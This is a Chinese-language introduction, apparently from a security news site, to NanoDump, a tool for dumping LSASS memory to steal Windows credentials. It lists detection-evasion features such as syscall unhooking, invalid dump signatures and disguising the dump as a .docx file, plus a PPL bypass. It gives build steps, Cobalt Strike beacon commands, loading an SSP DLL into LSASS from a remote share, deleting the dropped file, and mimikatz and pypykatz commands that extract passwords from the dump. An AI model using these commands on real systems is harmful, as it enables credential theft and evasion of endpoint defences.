![](https://image.3001.net/images/20220508/1652005222_62779966a26a5d600fc6b.png!small)

## 关于NanoDump

NanoDump是一款功能强大的MiniDump转储文件提取工具，在该工具的帮助下，广大研究人员可以轻松转储LSASS进程中的MiniDump数据。

## 功能介绍

> 1、大多数操作都使用了syscall（配合[ _SysWhispers_
> _2_](https://github.com/jthuraisamy/SysWhispers2)）；
>
> 2、通过ntdll地址调用syscall，以绕过某些系统调用检测；
>
> 3、支持将syscall回调钩子设置为NULL；
>
> 4、通过动态调用方法来调用Windows API；
>
> 5、支持选择下载转储文件而不需要触碰磁盘或写入文件；
>
> 6、默认情况下，MiniDump具有无效的签名以避免检测；
>
> 7、通过忽略不相关的DLL来减少转储的大小，NanoDump的输出数据大小约为10MB；
>
> 8、不需要提供LSASS的进程PID；
>
> 9、不会调用dbghelp或其他库，所有的转储逻辑都在NanoDump中实现；
>
> 10、支持进程Fork；
>
> 11、支持快照；
>
> 12、支持句柄拷贝；
>
> 13、支持MalSecLogon；
>
> 14、支持PPL用户态利用；
>
> 15、可以使用NanoDump的.exe版本在Cobalt Strike之外单独运行NanoDump；

## 工具安装&配置

首先，我们需要使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/helpsystems/nanodump.git

### Linux编译

在Linux系统上，我们需要使用MinGW来编译NanoDump源码：

    
    
    make -f Makefile.mingw

### Windows编译

在Windows系统上，我们需要使用MSVC来编译NanoDump源码：

    
    
    nmake -f Makefile.msvc

### Cobalt Strike导入

接下来，我们需要将生成的NanoDump.cna脚本导入到Cobalt Strike中。

## 工具使用

我们可以直接在Cobalt Strike的Beacon控制台中运行“nanodump”命令来使用NanoDump：

    
    
    beacon> nanodump

### 恢复签名

当你下载了NanoDump生成的MiniDump转储文件之后，可以使用下列命令来恢复无效签名：

    
    
    scripts/restore_signature <dumpfile>

### 获取敏感信息

下列命令可以通过mimikatz来获取转储文件中的敏感信息：

    
    
    mimikatz # sekurlsa::minidump <dumpfile>
    
    mimikatz # sekurlsa::logonPasswords full

如果你使用的是Linux系统，也可以使用mimikatz的Python 3版本，即[
_pypykatz_](https://github.com/skelsec/pypykatz)来获取转储文件中的敏感信息：

    
    
    python3 -m pypykatz lsa minidump <dumpfie>

### 以SSP加载NanoDump

我们可以在LSASS中以SSP的形式加载NanoDump以避免打开一个句柄。此时，转储的数据将使用一个无效签名（默认为C:\Windows\Temp\report.docx）来写入磁盘。当转储完成后，DllMain将返回FALSE来控制LSASS卸载NanoDump
DLL。

如需修改转储路径和签名配置，可以直接修改[
_entry.c_](https://github.com/helpsystems/nanodump/blob/main/source/entry.c)中的NanoDump函数。

### NanoDump DLL上传和加载

    
    
    beacon> load_ssp
    
    beacon> delete_file C:\Windows\Temp\[RANDOM].dll

 **加载本地DLL**

    
    
    beacon> load_ssp c:\ssp.dll

 **加载远程DLL**

    
    
    beacon> load_ssp \\10.10.10.10\openShare\ssp.dll

### PPL绕过

    
    
    beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp

## 工具使用演示

通过创建一个Fork间接读取LSASS进程数据，并使用无效签名将转储文件写入磁盘：

    
    
    beacon> nanodump --fork --write C:\lsass.dmp

使用MalSecLogon在一个记事本进程中获取LSASS句柄，然后拷贝句柄以访问LSASS，并读取转储信息：

    
    
    beacon> nanodump --malseclogon --dup --fork --binary C:\Windows\notepad.exe --valid

使用MalSecLogon获取句柄，通过使用Fork间接读取LSASS，并使用无效签名将转储文件写入磁盘：

    
    
    beacon> nanodump --malseclogon --fork --valid --write C:\Windows\Temp\lsass.dmp

使用无效签名下载转储文件：

    
    
    beacon> nanodump

拷贝现有句柄，并使用无效签名将转储文件写入磁盘：

    
    
    beacon> nanodump --dup --write C:\Windows\Temp\report.docx

获取LSASS进程PID：

    
    
    beacon> nanodump --getpid

在LSASS中以SSP加载NanoDump：

    
    
    beacon> load_ssp
    
    beacon> delete_file C:\Windows\Temp\[RANDOM].dll

在LSASS中以SSP加载NanoDump（远程）：

    
    
    beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll

转储LSASS并绕过PPL：

    
    
    beacon> nanodump_ppl --dup --write C:\Windows\Temp\lsass.dmp

## 工具运行截图

![](https://image.3001.net/images/20220508/1652005441_62779a418ae3a80d9ac8b.png!small)

## 许可证协议

本项目的开发与发布遵循[ _Apache_
_-2.0_](https://github.com/helpsystems/nanodump/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **NanoDump：** 【[ _GitHub传送门_](https://github.com/helpsystems/nanodump)】

## 参考资料

> [
> _https://github.com/jthuraisamy/SysWhispers2_](https://github.com/jthuraisamy/SysWhispers2)
>
> [
> _https://github.com/skelsec/pypykatz_](https://github.com/skelsec/pypykatz)
>
> [
> _https://github.com/helpsystems/nanodump/blob/main/source/entry.c_](https://github.com/helpsystems/nanodump/blob/main/source/entry.c)

